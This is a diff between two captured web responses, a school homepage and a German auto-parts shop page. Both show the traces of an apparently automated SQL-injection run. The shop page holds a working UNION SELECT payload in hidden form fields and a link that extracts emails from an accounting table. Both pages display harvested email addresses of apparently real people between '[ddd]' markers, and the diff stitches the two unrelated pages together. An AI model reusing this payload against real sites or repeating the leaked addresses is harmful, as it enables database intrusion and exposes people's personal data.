@@ -1,362 +1,49 @@
-<!DOCTYPE html>
-<html>
+HTTP/1.1 200 OK
+Date: Sun, 11 Feb 2018 08:08:28 GMT
+Server: Apache
+Set-Cookie: sessionid2=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=212.114.34.130
+Set-Cookie: sessionid2=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; domain=.autoteile-info.de
+Set-Cookie: sessionid3=26b5b371b78a68506a8ca1ca675b73cb; expires=Wed, 21-Feb-2018 08:08:28 GMT; Max-Age=864000; path=/; domain=212.114.34.130
+Set-Cookie: sessionid3=26b5b371b78a68506a8ca1ca675b73cb; expires=Wed, 21-Feb-2018 08:08:28 GMT; Max-Age=864000; path=/; domain=.autoteile-info.de
+Set-Cookie: PHPSESSID=41rc13ls6blrq4iu2rbngquen3; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Keep-Alive: timeout=5, max=100
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+Proxy-Connection: Close
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<title>Saint Soldier's School</title>
-<!-- for-mobile-apps -->
-
-<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false);
-		function hideURLbar(){ window.scrollTo(0,1); } </script>
-        
-        <link rel="shortcut icon" type="image/png" href="images/favicone.png"/>
-<!-- //for-mobile-apps -->
-<link href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all" />
-<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
-<!-- js -->
- <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700,600" rel="stylesheet" type="text/css">
-    <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
-    <link href="css/app.css" rel="stylesheet" type="text/css">
-
-<!-- //js -->
-<link href="css/ihover.css" rel="stylesheet" media="all">
-<link href="css/hover_pack.css" rel="stylesheet" media="all">
-
-<link rel="stylesheet" type="text/css" href="engine2/style.css" />
-	<script type="text/javascript" src="engine2/jquery.js"></script>
-
-	<!-- start-smoth-scrolling -->
-		
-</head>
-<body>
-<!-- header -->
-
-    <link rel="shortcut icon" type="image/PNG" href="images/favicone.PNG"/>
-    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
-    <link rel="stylesheet" type="text/css" href="css/demo.css" />
-    <link rel="stylesheet" type="text/css" href="css/style12.css" />
-   <link rel="stylesheet" href="css/nav_styles.css">
-   <script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
-   <script src="js/nav_script.js"></script>
-
-
-<div class="header">
-	<div class="container">
-	<div class="row">
-    <div class="col-md-1">
-    <a class="index.php" href="#"><img class="img-responsive logopositabs" src="images/logo11.png" style="margin-top:10px;"></a>
-    </div>
-    <div class="col-md-11" style="z-index:1">
-    <a href="index.php"><img class="img-responsive logopositabs" src="images/SAINT.PNG" style="margin-top: 18px;
-height: 29px; "></a>
-    
-<div class="row">
-<div class="col-md-12">
-<div id='cssmenu'>
-   
-<ul>
-
-   <li class='active'><a href='index.php'>Home</a></li>
-   <li class='has-sub'><a href='#'>About Us </a>
-     <ul>
-            <li><a href="our-aim.php?page=our-aim.php">Our Aim</a></li>
-           
-              <li><a href="why-saint.php?page=why-saint.php">Why Us</a></li>
-              <li><a href="school-song.php?page=song.php">School Song</a></li>
-              <li><a href="04053.pdf" target="_blank">School Information</a></li>
-          </ul>
-         </li>
-         <li class='has-sub'><a href='#'>Facilities</a>
-            <ul>
-           <li><a href="computer.php?page=computer.php">Computer & Science Lab</a></li>
-                <li><a href="activity.php?page=activity.php">Activities & Sports</a></li>
-                <li><a href="infant-wing.php?page=infant_wing.php">Infant Wing</a></li>
-             
-                 <li><a href="new-development.php">New Developments</a></li>
-          </ul>
-         </li>
-         
-         <li class='has-sub'><a href='#'>Admission</a>
-           <ul>
-           <li><a href="Procedures.php?page=Procedures.php">Procedures & Fees</a></li>
-                <li><a href="withdrawl.php?page=withdrawl.php">Withdrawal</a></li>
-				
-				                 <li><a href="login/admin/img/Admission-Form.pdf" target="_blank">Download Admission Form</a></li>
-				    		<li><a href="new/uniform.pdf" target="_blank">School Uniform (2018-19)</a></li>
-				<li><a href="Book List (2018-19) - School Website.pdf" target="_blank">Book List (2018-19)</a><br>
-	
-				 <li><a href="rules.php?page=rules.php">Rules</a></li>
-        
-		  </ul>
-         </li>
-         
-         <li><a href="academics.php?page=academics.php">Academics</a></li>
-         <li class='has-sub'><a href='#'>Memories</a>
-            <ul>
-            <li><a href="founder.php?page=founder.php">Our Founder</a></li>
-                <li><a href="visitor-book.php?page=visitor_book.php">Visitor Book</a></li>
-                
-                 <li><a href="xpressions.php?page=xpressions.php">Xpressions</a></li>
-                 
-          </ul>
-         </li>
-         
-         <li class='has-sub'><a href='#'>Calendar  </a>
-            <ul>
-            <li><a href="Important-Days2017-18.pdf" target="_blank">Important Dates</a></li>
-	<li><a href="ListofHolidays2017-18.pdf" target="_blank">List Of Holidays</a></li>
-				<li><a href="login/admin/category_img/Junior-Calendar.pdf" target="_blank">Juniors</a></li>
-
-<li><a href="login/admin/category_img/Senior-Calendar.pdf" target="_blank">Seniors</a></li>
-      </ul>
-         </li>
-             <li class=""><a href="Book List (2018-19) - School Website.pdf" target="_blank">Book List (2018-19)</a></li>
-    
-         <li class=""><a href="faq.php">FAQ</a></li>
-         <li class=""><a href="contact.php">Contact Us</a></li>
-         <li class=""><a href="carr.php">Career</a></li>
-        
-		
-		 <li class='has-sub'><a href='#'>Login</a>
-            <ul>
-			  <li><a href="https://ssdps.schoolpad.in/loginManager/load">Parent Login</a></li>
-			   <li><a href="teacher">Class Teacher Login</a></li>
-                <li><a href="staff">Teacher Login</a></li>
-			     <li><a href="login">Admin Login</a></li>
-          
-              
-                 
-          </ul>
-         </li>
-      </ul>
-   </li>
-   
-</ul>
-</div>
-
-
-</div>
-</div>
-
-
-</div>
-
-
-
-
-</div>
-	
-    
-    
-    
-    </div>	
-	</div>
-</div><!-- //header -->
-
-
-<link rel="stylesheet" href="http://netdna.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
-
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+		<meta name="keywords" content="  Autoteile,  Ersatzteile, ," />
+        <meta name="description" content=" Ersatzteile der Marken Sachs,ATE,Eberspächer und Bosal zu sehr günstigen Preisen! ">
+		<meta name="robots" content="INDEX,FOLLOW">
+		<meta http-equiv="Content-Language" content="de" />
+		<title>Neuteile Shop: neue Auto Ersatzteile   Autoteile   Ersatzteile f&uuml;r alle Marken - </title>
+		<link href="style2012.css" rel="stylesheet" type="text/css" />
 <style>
-
-ul { padding: 0; }
-
-li {
-  list-style: none;
-  padding: 0;
+img{border:0px;}
+#Herstellercont{display:none;}
+#Herstellercontbox :hover{cursor:pointer;}
+#Herstellercontbox h3{
+	color:#FFF;
+	background:#d9832a;
+	width:560px;
+	padding:15px 0px 15px 50px;
+	-moz-border-radius: 5px; -webkit-border-radius: 5px; border-radius: 5px;
 }
-
-h2 { text-align: center; }
-
-h2:not(:first-child) { margin-top: 45px; }
-.fff {
-  margin: 0 auto;
-  max-width:100%;
-}
-p { margin: 20px 0 10px; }
-
-p + p { margin-top: 0; }
-
-.carousel { margin: 0 30px;  width: calc(100% - ($button-spacing * 2));
-}
-
-.carousel[data-shift="1"] .carousel-inner > .item {
-  -webkit-transition: all .5s ease-in-out;
-  transition: all .5s ease-in-out;
-}
-
-.carousel .carousel-inner > .item.row { margin: 0; }
-
-.carousel .carousel-control {
-  background: none;
-  color: transparent;
-  overflow: hidden;
-  text-shadow: none;
-  -webkit-transition: all .3s ease-in-out;
-  transition: all .3s ease-in-out;
-  width: 30px;
-}
-
-.carousel .carousel-control:before {
-  color: #444;
-  font-family: 'Glyphicons Halflings';
-  position: absolute;
-  top: 50%;
-  -webkit-transform: translateY(-50%);
-  transform: translateY(-50%);
-  width: 30px;
-}
-
-.carousel .carousel-control:after {
-  border-radius: 50%;
-  box-shadow: 0 0 0 0 rgba(0, 0, 0, 0.7);
-  content: '';
-  height: 60%;
-  position: absolute;
-  top: 50%;
-  -webkit-transform: translateY(-50%);
-  transform: translateY(-50%);
-  -webkit-transition: all .3s ease-in-out;
-  transition: all .3s ease-in-out;
-  width: 100%;
-}
-
-.carousel .carousel-control:hover:after { box-shadow: 0 0 30px 0 rgba(0, 0, 0, 0.7); }
-
-.carousel .carousel-control.left { left: -30px; }
-
-.carousel .carousel-control.left:before { content: '\e079'; }
-
-.carousel .carousel-control.left:after { right: -100%; }
-
-.carousel .carousel-control.right { right: -30px; }
-
-.carousel .carousel-control.right:before { content: '\e080'; }
-
-.carousel .carousel-control.right:after { left: -100%; }
-
 </style>
-<link href="http://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
-<div class="container">
-<div class="row">
- 
-<div class="col-md-12">
- <div class="con1">
-<div class="row">
 
-
-<div class="col-md-12">
-
-<div class="fff">
-
-<div id="single" class="carousel slide" data-ride="carousel" data-shift="1">
-    <div class="carousel-inner">
-      <ul class="row item active">
-          </ul>
-    </div>
-    <a class="carousel-control left" href="#single" data-slide="prev">Previous</a> <a class="carousel-control right" href="#single" data-slide="next">Next</a> </div>
-    
-</div>
-
-
-</div>
-</div>
-
-
- 
-</div>
-
-
-</div>
-</div>
-</div>
- <!-- /.modal -->
-   
-  </body>
-
-
-
-
-<script>
-function centerModal() {
-    $(this).css('display', 'block');
-    var $dialog = $(this).find(".modal-dialog");
-    var offset = ($(window).height() - $dialog.height()) / 2;
-    // Center modal vertically in window
-    $dialog.css("margin-top", offset);
-}
-
-$('.modal').on('show.bs.modal', centerModal);
-$(window).on("resize", function () {
-    $('.modal:visible').each(centerModal);
-});
-</script>
-<script src="http://code.jquery.com/jquery-1.12.0.min.js"></script> 
-<script src="http://netdna.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script> 
-<script>
-var carousels = $('.carousel');
-carousels.each(function() {
-  var $obj = $(this);
-  var $inner = $obj.find('.carousel-inner');
-  
-  var id = 'uuid' + new Date().getTime();
-  $obj.addClass(id);
-
-  if ($obj.data('shift') === 1) {
-    var items = $obj.find('.item > [class*="col-"]'),
-        visibleCnt = $obj.find('.item:first [class*="col-"]').length,
-        wrapper = "";
-    
-    // build styles
-    var rule_base = '.carousel.' + id + ' .carousel-inner > .item',
-        styles = $('<style></style>'),
-        rules = [];
-        rules[0] = rule_base + '.next {left: ' + (100 / visibleCnt) + '%; transform: none;}';
-        rules[1] = rule_base + '.active {left: 0;}';
-        rules[2] = rule_base + '.active.left {left: -' + (100 / visibleCnt) + '%; transform: none;}';
-        rules[3] = rule_base + '.next.left {left: 0;}';
-        rules[4] = rule_base + '.active.right {left: ' + (100 / visibleCnt) + '%; transform: none;}';
-        rules[5] = rule_base + '.prev.right {left: 0;}';
-        rules[6] = rule_base + '.prev {left: -' + (100 / visibleCnt) + '%; transform: none;}';
-    for (var i = 0; i < rules.length; i++) {
-      styles.append(rules[i]);
-    }
-    $obj.prepend(styles);
-
-    // rebuild items
-    for (var i = 0; i < $(items).length; i++) {
-      var $item = $(items[i]);
-      var parent = $item.parent();
-      if (parent.hasClass('item')) {
-        if (!wrapper.length) {
-          wrapper = parent.clone().removeClass('active').html('');
-        }
-        $item.unwrap();
-      }
-      
-      var itemGroup = [$item];
-      for (var x = 1; x < visibleCnt; x++) {
-        var a = i + x;
-        var next = $(items[a]);
-        if (!next.length) {
-          next = $(items[(a - $(items).length)]);
-        }
-        itemGroup[x] = next.clone();
-      }
-      var newSet = wrapper.clone().html(itemGroup);
-      if (i == 0) {
-        newSet.addClass('active');
-      }
-      newSet.appendTo($inner);
-    }
-  }
-});
-
-</script>
-
-
+<script src="http://code.jquery.com/jquery-latest.js"></script>
 <script type="text/javascript">
 
   var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-36251023-1']);
-  _gaq.push(['_setDomainName', 'jqueryscript.net']);
+  _gaq.push(['_setAccount', 'UA-4917787-1']);
+  _gaq.push(['_setDomainName', 'neue.autoteile-info.de']);
   _gaq.push(['_trackPageview']);
 
   (function() {
@@ -366,127 +53,326 @@ carousels.each(function() {
   })();
 
 </script>
+<script language="JavaScript" type="text/Javascript">
+function agb_impressum() {
+	var x=window.open("static/ImpressAGB.html", "AGBImpressum","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function wiederruf() {
+	var x=window.open("static/ImpressAGB.html#wiederruf", "Wiederrufsbelehrung","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function kontakt() {
+	var x=window.open("static/kontakt/kontakt.php", "Kontakt","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function versand() {
+	var x=window.open("static/versand.html", "Versand","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function zahlung() {
+	var x=window.open("static/zahlung.html", "Zahlung","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function datenschutz() {
+	var x=window.open("static/datenschutz.html", "Zahlung","width=785,resizable=yes,menubar=no,scrollbars");
+	x.focus();
+}
+function hilfevers() {
+	var x=window.open("static/InfoVers.html", "Hilfe","width=785,resizable=yes,menubar=no,scrollbars");
+	x.foc
+us();
+}
+function waitsend() {
+ document.teileform.submit();
 
-    
-  <div class="container">
-  <div class="row">
-  <div class="col-md-12">
-    
-  
-    <div class="con1">
-<h3 class="hed">[ddd]k_patial@yahoo.com,rajindersaini2012@gmail.com,SUDESH.SHARY05@GMAIL.COM,DEEPTI22_VERMA@YAHOO.CO.IN,SAINI_ASHIMA@YAHOO.IN[ddd]</h3>
+ var x=window.open("static/Geduld.html", "Geduld","width=400,height=230,resizable=no,menubar=no");
+ x.focus();
+}
+function abholung() {
+	var x=window.open("static/abholung.html", "Abholung","width=785,resizable=yes,menubar=no,scrollbars");
+	x.foc
+us();
+}
+function prnummern() {
+	var x=window.open("Static/prnummer.html", "PR Nummern","width=785,resizable=yes,menubar=no,scrollbars");
+	x.foc
+us();
+}
+//
+</script>
+<script>
+$(document).ready(function(){
+ 
+        $("#Herstellercont").hide();
+ 
+    $('#Herstellercontbox').click(function(){
+    $("#Herstellercont").slideToggle();
+    });
+ 
+});
+ 
+</script>
 
-<img src="images/divider_line.png" class="img-responsive center-block" alt="Responsive image">
-<div class="row">
-<div class="col-md-1">
-</div>
-<div class="col-md-10">
+
+</head>
+
+<body>
+<div class="wrapper">
 
 
- <div class="rules">
-<p class="ali">
-3
-</p>
-</div>
-</div>
-<div class="col-md-1">
-
-</div>
-</div>
-</div>
-  
+<div class="head_shop"><div class="logo"><a href="http://www.autoteile-info.de/autoteile.html"><img src="img/logo.png" alt="Autoteile" /></a></div>
+<div class="span450 left"><h1 class="title">  Autoteile</h1></div>
+<div class="span190 left"><h2 class="title"><span class="nokfz"></span></h2>
   </div>
-  </div>
-  </div> 
-   
-   
-   
-   
+<div class="span195 right"><center>Ihr Warenkorb</center><br />
+<br />
+<a href="index.php?show=mywkshow" class="wklink">Wert: 0 €</a><br />
+Teile:   Stk.</div>
+</div>
+<div class="topbox">
+	<div class="headtopbox">
+		<div class="span451 left">Ersatzteile</div>
+    	<div class="span451 right">Hersteller- Modell- Typbezeichnung</div>
+	</div>
     
+<div class="contenttopbox">
+		<div class="span451 left">
+       	  <div class="kfz">
+        <b>Schl&uuml;sselnummer:</b>
+        <br \>
+        <br \>
+		<form method="post" action="index.php" style="float:left;">
+			<label style="float:left;">zu 2
+      		<input name="KBA2" size="4" maxlength="4" value="" type="text" class="input-xlarge"></label>
+			<label style="float:left; padding-left:12px;">zu 3
+     		<input name="KBA3"  size="3" maxlength="3" value="" type="text" class="input-xlarge"></label>
+    		<input name="sessionid" value="26b5b371b78a68506a8ca1ca675b73cb" type="hidden"><input name="referrer" value="" type="hidden">
+    		<button type="submit" class="btn btn-mini" style="margin-left:20px;" >weiter</button>
+		</form>  
+        <br \>  
+        <br \>
+        <br \> </div>
+		<b>Teilenummer:</b>
+        <br \>
+        <br \>
+    
+    	<form method="post" action="index.php" class="form-search">
+    		<input name="sessionid" value="26b5b371b78a68506a8ca1ca675b73cb" type="hidden">
+    		<input name="referrer" value="" type="hidden">
+			<input name="show" value="SearchOEN" type="hidden">
+   		 	<input name="OEN" type="text" class="input-xlarge" value="">
+  		  	<button type="submit" class="btn btn-mini">finden</button>
+    		<input name="tdHerstellerNr" value="211111111111111111111111111' UNION SELECT (select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.Email) as char))),0x20),0x5b6464645d) FROM (SELECT Email FROM ATI.`Buchhaltung_neu` WHERE `Email` LIKE char(37,64,37) LIMIT 14040,5)t limit 0,1),2--  " type="hidden">
+			<input name="tdModellNr" value="" type="hidden">
+			<input name="tdTypNr" value="" type="hidden">
+			<input name="KBA2" value="" type="hidden">
+			<input name="KBA3" value="" type="hidden">    
+    	</form>
+   	  </div>
+    	<div class="span451 right">
+        <div class="kfz">
 
+        <form method="post" action="index.php" style="padding:5px; margin:0px;float:left; width:400px;">
+			
+	<div class="row-fluid">
+	<form method="post" action="index.php" class="span11">
+    <div class="control-group">
+     <div class="controls span12">
+    <div class="input-prepend row-fluid">
 
-<!-- //footer -->
-<!--footer-bottom-->
-	<div class="footer-bottom">
-  <div class="container">
-    <div class="row">
-      <div class="col-sm-3">
-        <h3 class="add">St. Soldier's School</h3>
-        <br>
-        <img class="img-responsive logopositabs" src="images/logo11.png" alt="Saint"> </div>
-      <div class="col-sm-3">
-        <h3 class="add">Contact us</h3>
-        <br>
-        <div class="fot" style="color:rgba(233, 97, 97, 0.92);">Sector-16, Panchkula</div>
-        <div class="fot"  style="color:rgba(233, 97, 97, 0.92);">Haryana,INDIA</div>
-        <div class="fot"  style="color:rgba(233, 97, 97, 0.92);">(0172)2565184</div>
-        <div class="fot"  style="color:rgba(233, 97, 97, 0.92);">(0172)2565645</div>
-        <div class="fot"  style="color:rgba(233, 97, 97, 0.92);">(0172)2560471</div>
-        <div class="fot"  style="color:rgba(233, 97, 97, 0.92);">saintsoldierschool@yahoo.in<h1><font color="#ffffff">Top CBSE School in Panchkula</font></h1></div>
-        <br>
-      </div>
-      <div class="col-sm-3">
-        <h3 class="add">Downloads</h3>
-        xpressions.php <br>
-        <div class="fot">
-                    <a href="login/admin/img/Admission-Form.pdf" target="_blank"> Admission Form</a> </div>
-        <div class="fot"> <a href="xpressions.php"> Newsletter</a></div>
-        <div class="fot">
-                    <a href="sylabus.php">Syllabus</a> </div>
-        <div class="fot"> <a href="hollyday.php"> Holiday Homework</a></div>
-                   <div class="fot"> <a href="rev.php"> Revision Plan</a></div>
-                  <div class="fot">
-                    <a href="login/admin/pdf/Date Sheet - Term-II, 2018.pdf" target="_blank"> Date Sheet</a><h1><font color="#ffffff">Best School in Panchkula</font></h1> </div>
-          
-      </div>
-      <div class="col-sm-3">
-        <h3 class="add">Like Us</h3>
-        <br>
-		<div class="row">
-		<div class="col-md-3">
-		<div class="zoom"> <a href="https://www.facebook.com/ssdpspkl" target="_blank"> <img class="img-responsive logopositabs" alt="fb" src="images/facebook.png"></a> </div>
-		</div>
-		<div class="col-md-6">
-		<div class="zoom"> <a href="https://twitter.com/ssdpspkl" target="_blank"> <img class="img-responsive logopositabs" alt="Twitter" src="twiter.png" style="height:30px; width:30px;"></a> </div>
-		</div>
-		</div>
-		<br />
-        <div class="row">
-		<div class="col-md-3">
-		<div class="zoom"> <a href="https://plus.google.com/u/0/106173842858594633543" target="_blank"> <img class="img-responsive logopositabs" src="gg.png" alt="school" style="height:30px; width:30px;"></a> </div>
-		</div>
-		<div class="col-md-6">
-		<div class="zoom"> <a href="http://www.justdial.com/Chandigarh/St-Soldiers-School-%3Cnear%3E-Near-Sector-16-Market-Sector-16/0172PX172-X172-130215103153-B7E5_BZDET?xid=Q2hhbmRpZ2FyaCBDQlNFIFNjaG9vbHMgQ2hhbmRpZ2FyaCBHUE8=
-" target="_blank"> <img class="img-responsive logopositabs" src="images/jst.png" alt="jd"></a> </div>
-		</div>
-		</div>
-        
-        
-        
-      </div>
+    <select name="tdHerstellerNr" class="span9" size="1" onchange="this.form.submit()"> <option value="">Noch kein Hersteller gew&auml;hlt</option>\n <option value="2">ALFA ROMEO</option>
+<option value="866">ALPINA</option>
+<option value="5">AUDI</option>
+<option value="16">BMW</option>
+<option value="819">CADILLAC</option>
+<option value="138">CHEVROLET</option>
+<option value="20">CHRYSLER</option>
+<option value="21">CITROËN</option>
+<option value="139">DACIA</option>
+<option value="185">DAEWOO</option>
+<option value="25">DAIHATSU</option>
+<option value="26">DAIMLER</option>
+<option value="35">FIAT</option>
+<option value="36">FORD</option>
+<option value="776">FORD USA</option>
+<option value="45">HONDA</option>
+<option value="1506">HUMMER</option>
+<option value="183">HYUNDAI</option>
+<option value="54">ISUZU</option>
+<option value="55">IVECO</option>
+<option value="56">JAGUAR</option>
+<option value="882">JEEP</option>
+<option value="184">KIA</option>
+<option value="63">LADA</option>
+<option value="64">LANCIA</option>
+<option value="1820">LAND ROVER</option>
+<option value="842">LEXUS</option>
+<option value="72">MAZDA</option>
+<option value="74">MERCEDES-BENZ</option>
+<option value="75">MG</option>
+<option value="1523">MINI</option>
+<option value="77">MITSUBISHI</option>
+<option value="80">NISSAN</option>
+<option value="84">OPEL</option>
+<option value="88">PEUGEOT</option>
+<option value="92">PORSCHE</option>
+<option value="778">PROTON</option>
+<option value="93">RENAULT</option>
+<option value="95">ROVER</option>
+<option value="99">SAAB</option>
+<option value="104">SEAT</option>
+<option value="106">SKODA</option>
+<option value="1138">SMART</option>
+<option value="107">SUBARU</option>
+<option value="109">SUZUKI</option>
+<option value="110">TALBOT</option>
+<option value="111">TOYOTA</option>
+<option value="187">TRABANT</option>
+<option value="112">TRIUMPH</option>
+<option value="120">VOLVO</option>
+<option value="121">VW</option>
+</select> <button type="submit" class="btn btn-mini ">weiter</button>
+
     </div>
-    <div class="row">
-      <div class="col-md-12">
-        <p> All Rights Reserved | Design by <a href="http://dukeinfosys.com" target="_blank">www.dukeinfosys.com</a></p>
-      </div>
     </div>
-  </div>
+    </div>
+    </form>
+</div>
+			<input name="sessionid" value="26b5b371b78a68506a8ca1ca675b73cb" type="hidden">
+        	<input name="referrer" value="" type="hidden">
+  			<button type="submit" class="jhide btn btn-mini">weiter</button>
+  		</form>
+    
+   		<form method="post" action="index.php" style="padding:5px; margin:0px;">    
+    		
+
+ <div class="row-fluid">
+	<form method="post" class="span11">
+	<input name="tdHerstellerNr" value="211111111111111111111111111' UNION SELECT (select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.Email) as char))),0x20),0x5b6464645d) FROM (SELECT Email FROM ATI.`Buchhaltung_neu` WHERE `Email` LIKE char(37,64,37) LIMIT 14040,5)t limit 0,1),2--  " type="hidden">
+     <div class="control-group">
+     <div class="controls span12">
+    <div class="input-prepend row-fluid">
+
+   <select name="tdModellNr" class="span9" size="1" onchange="this.form.submit()">
+
+	<option value="2">[ddd]dursun.of@hotmail.de,service@autoteile-info.de,service@autoteile-info.de,service@autoteile-info.de,service@autoteile-info.de[ddd]</option>
+</select> <button type="submit" class="btn btn-mini">weiter</button>
+
+    </div>
+    </div>
+    </div>
+    </form>
+</div>
+    		<input name="sessionid" value="26b5b371b78a68506a8ca1ca675b73cb" type="hidden">
+    		<input name="referrer" value="" type="hidden">
+   		</form>
+   
+		<form method="post" action="index.php" style="padding:5px; margin:0px;">   
+ 			
+    		<input name="sessionid" value="26b5b371b78a68506a8ca1ca675b73cb" type="hidden">
+      	  <input name="referrer" value="" type="hidden">
+    	</form>  
+		</div>
+        </div>
+	</div>
+	<div class="foodtopbox"></div>
 </div>
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
-<script src="js/jquery.ssd-vertical-navigation.min.js"></script>
-<script src="js/app.js"></script>
+<div class="2col">
+	<div class="span230 left">
+		<div class="span230_head">
+    		<div class="span230_head_title">Quick Links</div>
+  	  	</div>
+		<div class="span230_bg">
+    		<div>
+<p>Bitte wählen Sie zuerst ihr Fahrzeug aus oder geben die gesuchte Artikel / Originalteilenummer in die Teilenummersuche ein.</p>
+<p><b>oder Direkt zu:</b></p>
+<ul class="nav nav-pills nav-stacked" style="float:left;">
+	<li><a href="http://neue.autoteile-info.de/">Neue Autoteile</a></li>
+	<li><a href="http://lichtmaschine_anlasser.autoteile-info.de/anlasser.php">Anlasser</a></li>
+	<li><a href="http://lichtmaschine_anlasser.autoteile-info.de/lichtmaschine.php">Lichtmaschine</a></li>
+	<li><a href="http://neue.autoteile-info.de/auspuff.php">Auspuff</a></li>
+</ul>
+<!-- eKomiSeal START -->
+<div id="eKomiSeal_default"></div>
+<!-- eKomiSeal END -->
 
-<script type="text/javascript" src="engine2/wowslider.js"></script>
-	<script type="text/javascript" src="engine2/script.js"></script>
-
-
-
-
+<!-- eKomiLoader START, only needed once per page -->
+<script type="text/javascript"> 
+ (function(){
+  eKomiIntegrationConfig = new Array(
+   {certId:'2291D607647ADE9'}
+  );
+  if(typeof eKomiIntegrationConfig != "undefined"){for(var eKomiIntegrationLoop=0;eKomiIntegrationLoop<eKomiIntegrationConfig.length;eKomiIntegrationLoop++){
+   var eKomiIntegrationContainer = document.createElement('script');
+   eKomiIntegrationContainer.type = 'text/javascript'; eKomiIntegrationContainer.defer = true;
+   eKomiIntegrationContainer.src = (document.location.protocol=='https:'?'https:':'http:') +"//connect.ekomi.de/integration_1386774056/" + eKomiIntegrationConfig[eKomiIntegrationLoop].certId + ".js";
+   document.getElementsByTagName("head")[0].appendChild(eKomiIntegrationContainer);
+  }}else{if('console' in window){ console.error('connectEkomiIntegration - Cannot read eKomiIntegrationConfig'); }}
+ })();
+</script>
+<!-- eKomiLoader END, only needed once per page -->
+<center><img src="img/info2.jpg" ></center></div>
+   		</div>
+		<div class="span230_foot"></div>
+	</div>
+	<div class="span695 right">
+		<div class="span695_head"></div>
+		<div class="span695_bg">
+        	<div style="margin:0px 10px 0px 10px; width:630px;">
+            
+            	
     
-    
-    
-    
+ <h2> Autoteile</h2>
+    <hr />
+<div style="clear:both;">Finden Sie    Ersatzteile speziell f&uuml;r Ihre Fahrzeug indem Sie ihr  
+  Modell 
+  <br />
+  ausw&auml;hlen. 
+  
+  Wir bieten Ihnen ein Sortiment von tausenden  
+ersatzteilen in Originalteile-Qualit&auml;t 
+zu <br />
+g&uuml;nstigen preisen 
+an. </div>
+<p></p>
+	<div id="Herstellercontbox"><h3>w&auml;hlen sie Ihr  Modell aus.</h3></div>
+<div id="Herstellercont"><a href="index.php?tdHerstellerNr=211111111111111111111111111' UNION SELECT (select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.Email) as char))),0x20),0x5b6464645d) FROM (SELECT Email FROM ATI.`Buchhaltung_neu` WHERE `Email` LIKE char(37,64,37) LIMIT 14040,5)t limit 0,1),2--  &tdModellNr=2"> <b>[ddd]dursun.of@hotmail.de,service@autoteile-info.de,service@autoteile-info.de,service@autoteile-info.de,service@autoteile-info.de[ddd]</b></a><br></div>
+
+<center><img src="img/parts.png" /></center>
+
+<hr />
+
+
+<strong>oft gesucht sind:</strong><br />
+ Katalysator, 
+ Kupplungssatz, 
+ Auspuff, 
+ Scheinwerfer, 
+ Zahnriemensatz
+
+<div style="clear:both;"></div>
+            
+            </div>
+        </div>
+		<div class="span695_foot"></div>
+	</div>
+</div>
+
+
+  <div class="foot">
+   	<a href="static/hilfe.html">Informationen + Hilfe</a> <a rel="external nofollow" href="static/agb.html">AGB + Impressum</a> <a href="static/kontakt.html">Kontakt + Mail</a><br />
+
+
+  </div><span style="text-align:justify; color:#999;"></span>
+</div>
+<center>&copy; 2014 Autoteile Info und Handel AIH GmbH<br /></center><script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
 </body>
-
 </html>
+
+
